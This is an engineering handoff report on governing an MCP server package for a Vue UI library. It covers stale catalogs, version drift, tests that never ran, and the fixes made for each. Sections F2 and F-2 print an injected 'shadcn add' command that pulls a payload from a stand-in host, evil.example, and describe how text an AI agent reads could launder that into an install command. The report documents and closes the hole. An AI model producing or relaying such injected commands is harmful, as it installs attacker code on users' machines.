# TASK-N2-A1 — Govern `@dzup-ui/mcp` as a public surface

> Handoff for [`consumer-agent-surface-tasks.md` → TASK-N2-A1](../consumer-agent-surface-tasks.md).
> Conventions: [`README.md §3 <repo_conventions>`](../README.md#3-how-these-tasks-are-written).
>
> **Run date:** 2026-09-01 · **Repo:** `ui/dzup-ui` · **Branch:** `main`
> **HEAD:** `51dec93c73214af2d1e424e3454a7122691fea48` (`51dec93 new version for themes`)
> **Worktree at run start:** **dirty — 136 entries** (the uncommitted N1 evidence
> program **plus** TASK-N2-T1's DTCG export). **At run end: 158.** Nothing was
> reverted, stashed, cleaned or committed. Exactly **24 paths** were touched by
> this task — 19 under `packages/mcp/`, 3 under `packages/tooling/src/validators/`,
> the repo-root `package.json`, and this report. Of those, only the repo-root
> `package.json` was already dirty from N1/T1, and it was edited **additively**
> (new `generate:mcp-surface` and `validate:mcp` scripts with their `//` doc
> keys; one project appended to `typecheck:all`; one link appended to
> `validate:all`). The git-ignored
> `packages/mcp/dist/` was rebuilt; nothing else outside those 24 paths was
> written.
> **Toolchain:** Node `v24.14.1`, Yarn `4.16.0`. `yarn <script>` resolves
> normally here. No gate result was read through a pipe; every exit code was
> captured to a file and echoed bare.
>
> **Evidence class: `locally qualified, worktree-dirty`.** Not CI, not release,
> not production. Every number below is bound to `51dec93` **plus** the
> uncommitted N1 + T1 working tree.
>
> **Nothing is committed, pushed, dispatched to CI, or published.** No registry
> mutation was performed; `server.json` was edited on disk only.

---

## 1. Headline — and the answer to the "not worth publishing" branch

`@dzup-ui/mcp` **is** worth governing. The retire-it branch the task prompt
opens does not apply: the package is a thin, correct-in-shape read layer over
artifacts the site already generates, it has a real audience, and the
competitive benchmark (`04-competitive-benchmark.md`) names an official MCP
server as 2026 table stakes. Retiring it would remove the only surface through
which the catalog reaches an AI client at all.

But the discovery phase found something worse than "ungoverned". The package is
**wrong today, in ways that reach published AI consumers**, and no gate in a
29-validator repository could see any of it:

| # | What is wrong | Who it reaches |
|---|---|---|
| **F1** | **41 of the 144 public components are invisible to every MCP client.** `list_components` / `get_component` answer from `apps/storybook/public/llms.txt`, built from `public-api.manifest.json`, which is stale by exactly the 43 symbols the ownership manifest classifies `public-component`. `DzRating`, `DzCalendar`, `DzProvider`, `DzThemeProvider`, `DzAppShell`, `DzTour`, `DzSidebar` … do not exist as far as Cursor / Claude Code / Windsurf are concerned. | Every agent that asks "what does dzup-ui have?" — and then hand-rolls the 30% it was told did not exist. |
| **F2** | **`get_install_command` interpolated an unvalidated free-text `name` into a `shadcn add` shell command.** A name containing a space appended a **second, caller-chosen registry URL** to a command the server's own `instructions` tell the assistant to hand the user to run. It also never checked the item existed. | Any agent whose context contains text it merely *read* — a README, an issue, a web page. Indirect prompt injection, laundered into an authoritative-looking install command from the official dzup-ui server. |
| **F3** | **The server reported `version 0.1.0` to every client** while npm shipped `0.2.0`. Three copies of the version (`package.json`, `src/index.ts`, `server.json` ×2) disagreed; the MCP-registry manifest was the stalest. | Every `initialize` handshake, and the public MCP registry entry. |
| **F4** | **The package's only test file had never run in any gate.** It was `src/registry.test.ts`; the root `vitest` include list is `packages/*/src/**/*.spec.ts`. `.github/workflows/` contains **zero** occurrences of the string `mcp`. | Nobody — which is the point. |
| **F5** | **That suite asserted against two git-ignored build artifacts** (`apps/storybook/public/llms.txt(-full)`) it called "the REAL generated artifacts". On a clean checkout they do not exist and the suite would have failed. It never had the chance, because of F4. | A masking pair: each defect hid the other. |
| **F6** | **Every tool advertised `"additionalProperties": false` and enforced nothing.** `registerTool` wraps a raw Zod shape in a *strip*-mode object, which silently drops unknown keys. The published JSON Schema and the enforced schema disagreed for all nine tools. | Any client that trusts the schema it was served. |

All six are fixed or ratcheted. Details in §6.

## 2. What was built

| # | File | Status | API effect |
|---|---|---|---|
| A1 | `packages/mcp/src/tools.spec.ts` | **new**, 457 lines, 50 tests | One top-level `describe` per exposed tool, tagged `[malformed]` / `[shape]` / `[error]`. |
| A2 | `packages/mcp/src/tools.contract.spec.ts` | **new**, 228 lines, 12 tests | Contract Spec over the **live `tools/list`** response — 8 clauses, corpus-scoped. |
| A3 | `packages/mcp/src/server.spec.ts` | **new**, 179 lines, 17 tests | Real `initialize` → `tools/list` → `tools/call` over `InMemoryTransport`. |
| A4 | `packages/mcp/src/registry.spec.ts` | **renamed** from `registry.test.ts`, 218 lines, 17 tests | Every original assertion kept; real-artifact cases now `skipIf` with a named reason. |
| A5 | `packages/mcp/src/__fixtures__/catalog.ts` | **new**, 201 lines | Committed fixture catalog + a **recording reader** — the data-source probe. |
| A6 | `packages/mcp/scripts/generate-tool-surface.ts` | **new**, 553 lines | The generator. Live `tools/list` + observed reads + spec-tag scan → the artifact and the README table. |
| A7 | `packages/mcp/docs/mcp-tool-surface.json` | **new**, generated, 884 lines | The evidence artifact — the capability-matrix equivalent for this surface. |
| A8 | `packages/tooling/src/validators/mcp-surface.ts` | **new**, 418 lines | `yarn validate:mcp`. Six clause groups; does **not** import the package. |
| A9 | `packages/tooling/src/validators/mcp-surface.spec.ts` | **new**, 284 lines, 30 tests | Every clause driven to failure, plus a green end-to-end run of the real repo. |
| A10 | `packages/tooling/src/validators/mcp-surface-ceilings.json` | **new** | Two downward-only ratchets. |
| A11 | `packages/mcp/tsconfig.test.json` | **new** | Typechecks the specs, fixtures and generator the emit config excludes. |
| A12 | `packages/mcp/src/index.ts` | modified | `VERSION` read from `package.json`; `.strict()` schemas; id/free-text validators. |
| A13 | `packages/mcp/src/registry.ts` | modified | `REGISTRY_ID_RE` / `REGISTRY_ID_MAX_LENGTH` / `isRegistryId` (**additive public API** on `./registry`); `blockUrl`/`templateUrl` now encode. |
| A14 | `packages/mcp/src/tools.ts` | modified | Id rejection in `getBlock`/`getTemplate`/`getInstallCommand`; `getInstallCommand` now verifies against the index. |
| A15 | `packages/mcp/scripts/e2e-smoke.mjs` | modified | Tool list + version read from the artifact, not typed. Asserts exact set equality. |
| A16 | `packages/mcp/README.md` | modified | Tool table replaced by a **generated** region. |
| A17 | `packages/mcp/package.json` | modified | `files` ships `docs`; documented `//files`. |
| A18 | `packages/mcp/server.json` | modified | `0.1.0` → `0.2.0` (two places). |
| A19 | `packages/mcp/PUBLISHING.md` | modified | Namespace fact corrected; version-derivation and `validate:mcp` documented. |
| A20 | `packages/mcp/tsconfig.json` · `vitest.config.ts` | modified | Specs/fixtures excluded from the published emit; spec glob aligned with the repo. |
| A21 | `package.json` (root) | modified — **additive** | `generate:mcp-surface`, `validate:mcp` (+ `//` doc keys), `tsconfig.test.json` in `typecheck:all`, `validate:mcp` appended to `validate:all`. |

**Public API effect on `@dzup-ui/mcp`:**

- **No new tool.** The surface is exactly the nine tools it shipped with — the
  task's `<scope>` clause holds.
- **No new export subpath.** `.` and `./registry` are unchanged, so the
  public-API specifier snapshot at
  `packages/tooling/src/resolution/dzup-resolution.spec.ts` needed **no** edit.
- **Three additive symbols** on `@dzup-ui/mcp/registry`: `REGISTRY_ID_RE`,
  `REGISTRY_ID_MAX_LENGTH`, `isRegistryId`.
- **Three behaviour changes** a consumer could observe, all narrowing
  wrong-input paths, none narrowing a working call — see owner decision **D3**.

## 3. Discovery — the governed-component bar vs. the state found

The bar the task sets is "governed exactly like any public component". Mapping
the component instruments onto a non-component surface:

| Component instrument | State found for `@dzup-ui/mcp` | What replaced it |
|---|---|---|
| `Dz{Name}.contract.spec.ts` | absent | `src/tools.contract.spec.ts`, driven by the live tool list (corpus scope) |
| `Dz{Name}.spec.ts` | one file, wrong extension, never run | `src/tools.spec.ts` — one block per tool |
| ownership-manifest entry | absent, **and not expressible** | **stop condition hit** — see §4 |
| capability-matrix row | absent, **and not expressible** | `docs/mcp-tool-surface.json` — the documented equivalent |
| a validator | none | `yarn validate:mcp`, 30th link in `validate:all` |
| generated README facts | tool table hand-typed | generated region + freshness gate |
| ratchets | none | two, both downward-only |
| typecheck | source only; tests and scripts **never typechecked** | `tsconfig.test.json` in `typecheck:all` |
| lint | already covered (`yarn lint` targets `packages/`) | unchanged |
| CI | **no occurrence of `mcp` in `.github/workflows/`** | the `.spec.ts` rename puts the suite inside CI's existing `yarn test` |

### Build/export reality check (`<discovery>` step 2)

- `packages/mcp/dist/` **is on disk and is git-ignored** (`.gitignore:9`); **no
  package in this repo tracks `dist/`**. Confirmed against T1's identical
  finding.
- **The checked-in `dist/` was current with `src/`** before this task — verified
  on three facts before rebuilding: `dist/index.js` carried `VERSION = '0.1.0'`
  matching the then-current `src/index.ts`; `dist/registry.js:106-108` carried
  the same unencoded `blockUrl`; the exported symbol set matched. **There is no
  dist/src divergence finding.** `dist/` was rebuilt after the source changes and
  the e2e smoke re-run against it (§5).
- **Declared exports match reality**, with one asymmetry: `dist/tools.js` is
  built and shipped but is **not** in the `exports` map, so Node's encapsulation
  makes it unreachable. That is dead weight in the tarball, not an accidental
  API. `validate:mcp` reports it as a note.
- The published README linked to `./docs/mcp-tool-surface.json`, which `files`
  did not ship — fixed by adding `docs`, and `validate:mcp` now fails on any
  relative README link `files` does not ship. It warns (does not fail) on
  `../../DESIGN.md`, which **404s on the npm page today** — pre-existing.

## 4. Stop condition hit — ownership manifest schema 1.1.0 cannot classify this package

The task's `<discovery>` step 3 anticipated this, and it is what the evidence
says. **No `@dzup-ui/mcp` entry was added to the ownership manifest**, and no
`kind` was invented.

Three independent reasons, each sufficient:

1. **`OwnershipKind` has no value that fits.** The nine admissible kinds are
   `public-component · compound-part · composable · type · recipe ·
   token-module · internal · compat-alias · unclassified`. This package's public
   symbols are an MCP server factory (`createServer`), a registration function
   (`registerTools`), a cached HTTP/FS client class (`RegistryClient`), three
   pure parsers, a validator predicate and a version string. None is a Vue
   composable, a `tv()` recipe or a token module.
2. **`unclassified` is not the escape hatch.** It is a ratcheted debt counter
   (ceiling **29**, `packages/tooling/src/ownership/unclassified-ceiling.json`)
   meaning "the authorities could not decide". Filing ~9 symbols there would
   raise a ratchet that only falls, and would misrepresent a *decidable* set as
   undecided.
3. **The manifest is not scoped to this package.** It is
   `packages/core/manifests/component-ownership.manifest.json`, `tier: "core"`,
   `generatedFrom` a fixed list of `packages/core/**` and `packages/compat/**`
   globs, and its 1,327 entries cover exactly `@dzup-ui/core` (1,314) and
   `@dzup-ui/compat` (13). Admitting a third package is an authority change to
   `generate-ownership-manifest.ts`, not a data addition.

**Recorded for the schema-1.2.0 owner decision (D1), not acted on.** The same
argument applies to the capability matrix: its 144 rows are one-per-component
and its cell kinds (`contract-spec`, `unit-spec`, `axe`, `story-light-dark`,
`ssr-sample`, `token-contrast`, `keyboard-spec`, `state-stories`,
`browser-matrix`, AT, perf, visual) are component-shaped. A tool surface has no
axe run and no light/dark story. `docs/mcp-tool-surface.json` is the
**documented equivalent** the task explicitly allows, and it deliberately reuses
the matrix's own vocabulary — `kind` / `scope` / `state` /
`artifacts` / `note`, with `scope: "corpus"` for a gate that covers everything at
once, exactly as the capability matrix already does for `token-contrast`.

## 5. The artifact and how it derives

`packages/mcp/docs/mcp-tool-surface.json` — 9 tools × 6 evidence cells, plus the
catalog-visibility record.

Nothing in it is typed by a human:

| Field | Derived from |
|---|---|
| tool name / title / description / `inputSchema` | a **real `tools/list` round-trip** over `InMemoryTransport` against the real `createServer()` |
| `version` / `serverName` | the client's `getServerVersion()` after a real `initialize` |
| `dataSource.reads` | **observed** — each tool is called through a reader that records every site path it requests |
| `dataSource.readPatterns` | the observed paths with the probe's own argument values substituted back out (`/r/<name>.json`) |
| `errorsOnUnknown` | a second, deliberately unresolvable call, observed |
| `unit-spec` / `malformed-input` cells | a scan of `tools.spec.ts` for a top-level `describe('<tool>')` and an `it('[malformed] …')` inside it |
| `protocol-roundtrip` / `e2e-smoke` cells | a scan of `server.spec.ts` and `scripts/e2e-smoke.mjs` |
| `catalogVisibility` | the intersection of two **committed** manifests — ownership `public-component` entries vs. `public-api.manifest.json` component exports |

The one hand-written table in the generator is `PROBES` — *input*, never an
answer — and contract clause **C8** fails when a registered tool has no probe,
so the surface cannot grow uncovered.

**Determinism.** The generator reads committed fixtures, never
`apps/storybook/public/llms.txt` (a git-ignored build output), so it emits the
same bytes on CI, on a cold clone, and here. `sourceCommit` is stamped from
`git rev-parse HEAD` and **excluded from the freshness diff** — the same
treatment the ownership manifest gives it, and the reason **B1**'s off-by-one
cannot bite: the field is provenance, and nothing gates on it.

### The evidence matrix as generated

| Tool | contract-spec | unit-spec | malformed-input | data-source | protocol-roundtrip | e2e-smoke |
|---|---|---|---|---|---|---|
| `get_block` | pass | present | present | pass | present | present |
| `get_component` | pass | present | present | pass | present | **unrun** |
| `get_install_command` | pass | present | present | pass | present | **unrun** |
| `get_template` | pass | present | present | pass | present | **unrun** |
| `list_blocks` | pass | present | present | pass | present | **unrun** |
| `list_components` | pass | present | present | pass | present | present |
| `list_templates` | pass | present | present | pass | present | **unrun** |
| `list_tokens` | pass | present | present | pass | present | **unrun** |
| `search` | pass | present | present | pass | present | present |

Six `unrun` cells are **kept visible** rather than collapsed: the smoke script
names all nine tools in its `tools/list` assertion but only *calls* three
against the built `dist/`. Ratcheted at 6.

## 6. What was fixed, and why each fix is safe

### F1 · 41 public components invisible — **made detectable, not silently fixed**

The root cause is upstream of this package: `public-api.manifest.json` omits 43
symbols the ownership manifest calls `public-component`, and
`apps/storybook/scripts/build-llms.mjs` builds `llms.txt` from that manifest.

**Constraint B3 forbids running `generate:exports`** — it would also drop 5
composables and add 2 to the public API, and *a generator never decides public
API*. So this task did the only thing inside its authority: made the gap a
**named, ratcheted, downward-only number** that a validator prints on every run.

```
ratchets: 43 public components unreachable · 6 tools not smoke-called
```

The 43 are listed by symbol in the artifact. Closing it is **owner decision D2**.

### F2 · `get_install_command` shell-command injection — **fixed**

Measured before the fix, verbatim:

```
Install the block "hero-centered.json https://evil.example/payload" into a Vue 3 project:
…
npx shadcn@latest add https://dzup-ui.com/r/hero-centered.json https://evil.example/payload.json
```

`shadcn add` accepts multiple URLs and installs all of them. The tool also
printed a confident install command for `no-such-block-at-all`.

Fixed three ways:

1. `REGISTRY_ID_RE = /^[a-z0-9]+(?:-[a-z0-9]+)*$/`, max 64 chars — **measured,
   not invented**: all **132** ids in the two shipped registries match it
   exactly, longest 20 characters.
2. Enforced at the **protocol boundary** (zod `.regex()` on `get_block` /
   `get_template`) *and* in `tools.ts` (because `registerTools`, `createServer`
   and all of `./registry` are public exports — a library consumer gets the same
   guarantee as a stdio client).
3. `getInstallCommand` now **verifies the item against the generated index**
   before printing anything. This also closed its `data-source` cell: it was the
   one tool in the package that answered without reading the catalog at all.

The rejection message deliberately **does not echo the rejected value**. Every
other message in the module quotes its argument back, which is right for a value
that passed validation and wrong for one that did not — the whole reason the
check exists is that the caller's text is untrusted, and re-emitting it under
the dzup-ui server's own name is the amplification step.

`blockUrl`/`templateUrl` now `encodeURIComponent` like `block()`/`template()`
already did — the fetched item and the advertised URL could previously differ
for the same argument.

### F3 · version drift — **fixed at the source**

`src/index.ts` now reads `package.json` at runtime:

```ts
export const VERSION: string = (
  JSON.parse(readFileSync(join(import.meta.dirname, '../package.json'), 'utf8')) as { version: string }
).version
```

`../package.json` is correct from **both** layouts (`src/` and the emitted
`dist/` are each one directory below the package root), and `package.json` is
always in an npm tarball regardless of `files`. **No fallback** — a default
would restore the silent-drift failure mode it replaces.

`import.meta.dirname` rather than `new URL(…, import.meta.url)`: under the
repo-root Vitest config the SSR transform does not give a *dependency* module a
`file:` `import.meta.url`, and `readFileSync(URL)` throws `The URL must be of
scheme file`. Found by running the specs in both lanes, not by reasoning.

`server.json` still carries its own copy — the MCP registry schema requires one
— so `validate:mcp` compares five places: `package.json`, `server.json#version`,
`server.json#packages[0].version`, `CHANGELOG.md`'s newest heading, and **what
the server actually reports over MCP**.

### F4 · the test lane that never started — **fixed by naming**

`registry.test.ts` → `registry.spec.ts`. The root config's include list
(`packages/*/src/**/*.spec.ts`) now matches, so CI's existing `yarn test` job
runs the suite — **no workflow file was edited**. The package's own
`vitest.config.ts` include was aligned to `*.spec.ts`, and `tsconfig.json`
`exclude` was widened so specs and fixtures cannot reach the published `dist/`.

Verified in **both** lanes: 96 tests, green under `vitest run packages/mcp`
(root config, jsdom) *and* `vitest run --root packages/mcp` (package config,
node).

### F5 · a suite asserting against git-ignored build artifacts — **made honest**

`apps/storybook/public/llms.txt` and `llms-full.txt` are ignored by
`apps/storybook/.gitignore:14-15`. The six real-artifact cases now `skipIf` on a
presence check and print a named warning; behaviour and contract coverage moved
to committed fixtures. An unrun cell stays visible instead of becoming either a
red build or a silent pass.

### F6 · the schema that advertised what it did not enforce — **fixed**

Every `inputSchema` is now `z.object({…}).strict()`. Measured: the emitted JSON
Schema is **byte-identical** either way (`"additionalProperties": false` in
both), so this is not a contract change — it is the contract beginning to hold.
Contract clause **C3** pins it, and the seeded-failure run below shows what it
catches.

## 7. Proof the gates can fail

Five seeded violations, each with the verbatim error, each restored and
re-verified. **All seven touched files hash byte-identical to their pre-seed
state** (`sha256sum` diff clean).

### S1 · `server.json` reverted to `0.1.0` — the exact drift found

Seed: `sed 's/"version": "0.2.0"/"version": "0.1.0"/'` on `packages/mcp/server.json`.

```
@dzup-ui/mcp surface: 2 error(s)

  ✗ packages/mcp/server.json#version says "0.1.0" but packages/mcp/package.json says "0.2.0". Every client that connects reads one of these; they must be the same number.
  ✗ packages/mcp/server.json#packages[0].version says "0.1.0" but packages/mcp/package.json says "0.2.0". Every client that connects reads one of these; they must be the same number.
```

### S2 · a tenth tool, undocumented, answering from a hard-coded list

Seed: a `list_favourites` tool registered in `index.ts` returning the literal
string `'DzButton, DzCard'`.

`yarn validate:mcp`:

```
  ✗ The generated surface is stale or the generator failed:
[mcp-surface] FAIL
  • packages/mcp/docs/mcp-tool-surface.json is STALE — it disagrees with a live tools/list round-trip. Run `yarn generate:mcp-surface`.
  • packages/mcp/README.md's generated tool table is STALE. Run `yarn generate:mcp-surface`.
```

The contract spec caught it **three independent ways** on the same seed:

```
AssertionError: tools answering without reading the catalog: expected [ 'list_favourites' ] to deeply equal []
AssertionError: tools with no describe() block in tools.spec.ts: expected [ 'list_favourites' ] to deeply equal []
AssertionError: list_favourites probe failed: … MCP error -32602 …
Tests  3 failed | 9 passed (12)
```

### S3 · a tool loses its only `[malformed]` case

Seed: the `[malformed]` tag removed from one `it()` in `list_tokens`, **then the
artifact regenerated** — so freshness is green and only the evidence clause can
catch it.

```
  ✗ list_tokens: `malformed-input` is unrun. Add an `it('[malformed] …')` case inside its describe block in packages/mcp/src/tools.spec.ts.
```

### S4 · `get_install_command` stops reading the catalog

Seed: the index lookup replaced with an empty literal and the `client.tokens()`
call removed — i.e. the pre-fix behaviour restored — then regenerated.

```
  ✗ get_install_command: `data-source` is unrun. …
  ✗ get_install_command answered without reading a single generated catalog artifact. A tool that answers from a list inside this package is a second source of truth.
```

and, from the contract spec:

```
AssertionError: tools answering without reading the catalog: expected [ 'get_install_command' ] to deeply equal []
```

### S5 · the ratchet, in both directions

Seed: `catalogVisibilityUnreachable.ceiling` set to `42`, then to `44`.

```
  ✗ 43 public components are unreachable through this MCP server, above the ceiling of 42. New: DzAffix, DzAnchor, DzAppShell, …
```
```
  ✗ Unreachable public components fell to 43 (ceiling 44). Lower `catalogVisibilityUnreachable.ceiling` in packages/tooling/src/validators/mcp-surface-ceilings.json to 43.
```

### Restoration

```
$ diff hashes-before.txt hashes-after.txt
ALL 7 SEEDED FILES RESTORED BYTE-IDENTICAL
$ npx tsx packages/tooling/src/validators/mcp-surface.ts ; echo $?
@dzup-ui/mcp surface OK — 9 tools, all with a contract clause, a unit spec, a [malformed] case and an observed data source; version 0.2.0 agrees across package.json, server.json (x2), CHANGELOG.md and the artifact.
  ratchets: 43 public components unreachable · 6 tools not smoke-called
0
```

Beyond the seeded runs, `mcp-surface.spec.ts` drives **every** clause to failure
with a fabricated input — 30 tests, including one that runs the real repository
through `runChecks()` and asserts zero errors.

## 8. Focused validation output

Narrowest owning command first, then widening — §9 carries the aggregate.

### 8a. `packages/mcp` — 96 tests, green in **both** lanes

```
$ npx vitest run --root packages/mcp        # the package lane, node environment
 Test Files  4 passed (4)
      Tests  96 passed (96)

$ npx vitest run packages/mcp               # the ROOT config — i.e. what `yarn test` runs
 Test Files  4 passed (4)
      Tests  96 passed (96)
```

Both lanes matter and both are new information. The package lane is the one
`yarn workspace @dzup-ui/mcp test` uses; the root lane is the one **CI** uses,
and until this task nothing in this package matched its include globs. Running
in both is also what surfaced the `import.meta.url` difference in §6/F3.

Composition: `registry.spec.ts` 17 · `tools.spec.ts` 50 · `server.spec.ts` 17 ·
`tools.contract.spec.ts` 12. Before this task: **1 file, 9 tests, 0 lanes**.

### 8b. The validator's own specs — 30 tests

```
$ npx vitest run packages/tooling/src/validators/mcp-surface.spec.ts
 Test Files  1 passed (1)
      Tests  30 passed (30)
```

Includes `describe('the real repository') > is green through the same path the
CLI takes`, so the repo's actual state is asserted by a test and not only by a
CLI run.

### 8c. `yarn validate:mcp` — exit 0

```
  note: dist modules shipped but not reachable through the `exports` map: tools.js. Encapsulated by Node, so this is dead weight in the tarball rather than an accidental API.
  warn: README.md links to ../../DESIGN.md, which is outside the package — it 404s on the npm page.
@dzup-ui/mcp surface OK — 9 tools, all with a contract clause, a unit spec, a [malformed] case and an observed data source; version 0.2.0 agrees across package.json, server.json (x2), CHANGELOG.md and the artifact.
  ratchets: 43 public components unreachable · 6 tools not smoke-called
```

### 8d. `node packages/mcp/scripts/e2e-smoke.mjs` — exit 0, against the rebuilt `dist/`

```
dzup-ui MCP server running (registry: C:\…\ui\dzup-ui, default: https://dzup-ui.com)
✓ initialize → serverInfo.name = dzup-ui
✓ initialize → serverInfo.version = 0.2.0 (package.json says 0.2.0)
✓ tools/list → exactly the 9 tools in docs/mcp-tool-surface.json: get_block, get_component, get_install_command, get_template, list_blocks, list_components, list_templates, list_tokens, search
✓ list_components(Buttons) → includes DzButton
✓ get_block(hero-centered) → real install command
✓ get_block(hero-centered) → real .vue source
✓ search(pricing) → results
✓ get_block(nope) → isError

All end-to-end MCP checks passed.
```

The version line is new and is the end-to-end proof of the F3 fix: it is read
from `package.json` by the assertion and from `dist/index.js` by the server, over
real JSON-RPC, in a separate process.

### 8e. Generator determinism

`yarn generate:mcp-surface` run twice produced byte-identical output (the
`--check` mode compares everything except the provenance stamp and was green
immediately after a fresh write). The generator reads only committed inputs.

## 9. Aggregate qualification

Run from a clean shell after every source change was final. Each exit code was
written to a file and echoed bare — never read through a pipe.

| Gate | Exit | Result |
|---|---|---|
| `yarn typecheck:all` | **0** | Now also covers `packages/mcp/tsconfig.test.json` — the package's specs, fixtures and generator, none of which had ever been type-checked. |
| `yarn lint` | **0** | `--max-warnings 0`, over `packages/ apps/` (B6). Zero errors, zero warnings. |
| `yarn validate:all` | **0** | **30 links** (29 → 30; `validate:mcp` appended after `validate:ownership`). `validate:mcp` reports green inside the chain at line 139 of the run log, with its two ratchet numbers. |
| `yarn test` | **1** | **8,709 passed · 2 failed · 2 skipped · 1 todo (8,714)**, 484/486 files. The two failures are **exactly** B5's pre-existing pair. |

### The two failures are the known pre-existing ones — not this task's

```
FAIL packages/tooling/src/token-checks/landing-token-fallbacks.spec.ts > landing token fallbacks > every fallback matches the value its token resolves to
FAIL packages/tooling/src/validators/story-dod-tiers.spec.ts > countOpen > subtracts a waiver
```

These are `B5` verbatim. Neither file was read for edit by this task, neither is
in `packages/mcp`, and no ceiling was moved to make either pass.

### What this task added to the aggregate

`yarn test` gained **126 tests**: 96 in `packages/mcp/src/*.spec.ts` (four files,
all four confirmed present in the run log) and 30 in
`packages/tooling/src/validators/mcp-surface.spec.ts`. **All 126 are green in the
aggregate run**, including the `mcp-surface.spec.ts` case that drives the real
repository through `runChecks()`.

The 96 are net-new coverage in this lane in the strictest sense: the 9 tests they
replace lived in a file the root config never matched, so `yarn test` went from
**0** `@dzup-ui/mcp` tests to **96**.

### Maturity level reached

Per `<maturity_levels>`, this packet reaches **aggregate-qualified** and stops
there:

- **specified** — contract spec written, 8 clauses, over the live tool list.
- **implemented** — six defects fixed in source; no new tool.
- **focused-validated** — §8: 96 + 30 tests, `validate:mcp` exit 0, e2e smoke
  exit 0 against the rebuilt `dist/`, five seeded gate failures with byte-identical
  restoration.
- **aggregate-qualified** — this section: `typecheck:all`, `lint` and
  `validate:all` all exit 0; `yarn test` red only on B5's pair.
- **browser/AT-qualified** — **n/a**: this is a Node stdio server, not a
  component. The nearest analogue is the e2e smoke lane against the published
  `dist/`, which is green but covers only 3 of 9 tools (ratcheted at 6).
- **packaged** — `yarn workspace @dzup-ui/mcp build` exits 0 and the smoke test
  drives the emitted `dist/index.js` over real JSON-RPC. **`files` now ships
  `docs/` as well; that change has not been proven by a `yarn pack` inspection.**
- **released** — **not reached, not attempted.** No changeset written, no
  version bumped beyond aligning `server.json` to the version already published,
  no npm publish, no `mcp-publisher publish`. See owner decisions D3 and D5.

Everything above is **locally qualified, worktree-dirty**. The tree carries the
whole uncommitted N1 program plus T1's DTCG export, so none of it is CI evidence
and none of it is release evidence.

## 10. Findings — defects no gate in this repo could previously see

Ranked by blast radius. F1–F6 are summarised in §1; F7–F9 are new here.

### F-1 · 41 public components are invisible to every AI client 🔴

**Measured.** `list_components` returns **159** entries (101 public components +
58 compound parts). The ownership manifest classifies **144** symbols
`public-component`. **43 of them** — 41 `Dz*` plus `GovernanceBadge` and
`TeamMemberBadge` — are absent from `public-api.manifest.json`, which is what
`apps/storybook/scripts/build-llms.mjs` reads to build `llms.txt`, which is what
these two tools read.

The 41 `Dz*`: `DzAffix DzAnchor DzAppShell DzAsyncBoundary DzBackTop DzBlockUI
DzCalendar DzCascader DzCodeBlock DzConfirmDialog DzCopyButton DzDataView
DzDescriptions DzErrorBoundary DzFab DzFieldArray DzFloatLabel
DzImageComparison DzInfiniteScroll DzInplace DzInputMask DzKnob DzMasonry
DzMegaMenu DzMention DzMeterGroup DzOrderList DzPageHero DzPanel DzPopconfirm
DzProvider DzQRCode DzRating DzSidebar DzSpeedDial DzTagsInput DzThemeProvider
DzToolbar DzTour DzTreeSelect DzWatermark`.

`DzProvider` and `DzThemeProvider` are the ADR-20 provider contract. An agent
asking this server how to set up a dzup-ui app is told they do not exist.

**Why no gate saw it.** Every existing gate compares a manifest to *source*.
Nothing compared the manifest to *what the AI-facing surface serves*, because
that surface had no gate at all. The class is the same as N1's "nothing asserted
the absence of a thing": here, nothing asserted the **completeness** of a
derived, published projection.

**Not silently fixed** — B3 forbids `generate:exports`. Ratcheted at 43, listed
by symbol, printed on every `validate:mcp` run. → **owner decision D2**.

### F-2 · `get_install_command` was a prompt-injection to shell-command laundering path 🔴

Verbatim, before the fix:

```
npx shadcn@latest add https://dzup-ui.com/r/hero-centered.json https://evil.example/payload.json
```

Three things had to be true at once, and all three were:

1. the `name` argument was unvalidated free text;
2. it was interpolated into a fenced `sh` block that the server's own
   `instructions` field tells the assistant to hand the user to run;
3. `shadcn add` accepts multiple URLs.

The tool also emitted a confident command for `no-such-block-at-all` — it never
touched the catalog.

**Why no gate saw it.** The repo's security corpus (Tier D, `packages/*/security/`)
covers *components* rendering hostile input into a DOM. Nothing covered a
*package* rendering hostile input into a **shell command an agent executes**, and
`@dzup-ui/mcp` had no tier, no risk classification and no security cell — because
it was not in the quality matrix at all.

Fixed (§6). The fix is pinned by three spec cases per affected tool plus contract
clause C3.

### F-3 · The server told every client it was version 0.1.0 🟠

Proven over the real protocol before the fix:
`serverInfo {"name":"dzup-ui","version":"0.1.0"}` while `package.json` said
`0.2.0` and the CHANGELOG documented a `0.2.0` release. `server.json` — the
manifest the **public MCP registry** would ingest — also said `0.1.0` twice.

**Why no gate saw it.** `validate:readme-facts` (TASK-OSS-P2-02) fixed exactly
this class for the root README's package table, and `validate:engines` fixed it
for the Node floor. Neither reaches inside a package to a literal in a `.ts`
file or a field in a non-npm manifest. This is the **third** instance of the
same class in this repository, and the second one T1 also found
(`packages/tokens/README.md` documenting two exports that do not exist).

### F-4 · A published package's only test suite had never run in any lane 🔴

`packages/mcp/src/registry.test.ts` · root include `packages/*/src/**/*.spec.ts` ·
`.github/workflows/` grep for `mcp` → **0 hits**. Nine tests, zero executions in
a gate, for the entire life of the package.

Adjacent measurement, worth its own line: the root `vitest.config.ts` coverage
`include` **is** `packages/*/src/**/*.{ts,vue}`, with an 80% four-metric threshold
on `packages/*/src/**`. `packages/mcp/src` matched that include the whole time
while contributing no executed lines. Whatever `yarn test:coverage` has been
reporting for the package bar has had this package in the denominator and not in
the numerator.

**Class:** the same one as N1's "a test lane that had silently not started for
20+ commits" — but caused by a **filename**, which no lane-status check would
look for.

### F-5 · That suite asserted against git-ignored build outputs 🟠

`apps/storybook/public/llms.txt` and `llms-full.txt` are ignored by
`apps/storybook/.gitignore:14-15`. The suite's own comment called them "the REAL
generated artifacts from the repo's public dirs, proving the MCP surface stays
in lockstep with what the website ships". On a clean CI checkout they are absent
and `client.components()` throws.

The two defects were **mutually masking**: F4 meant the suite never ran, so F5
never fired; F5 meant that fixing F4 naively — just renaming the file — would
have turned CI red. Both had to be found together, and neither is visible from
the other's vantage point.

### F-6 · Nine published JSON Schemas advertised a constraint the server did not enforce 🟠

`registerTool(name, { inputSchema: <raw zod shape> })` wraps the shape in a
strip-mode `z.object`. `zod-to-json-schema` emits `"additionalProperties": false`
for it. Strip mode **drops** unknown keys; it does not reject them. Measured:
`{ family: 'Buttons', notARealArgument: 'x' }` returned a normal result.

Fixed by passing `.strict()` objects — the emitted schema is byte-identical, so
nothing on the wire changed except that the constraint now holds.

**Class:** a published contract whose *enforcement* lives in a dependency's
default. Nothing in this repo compares an advertised schema to an enforced one
for any package.

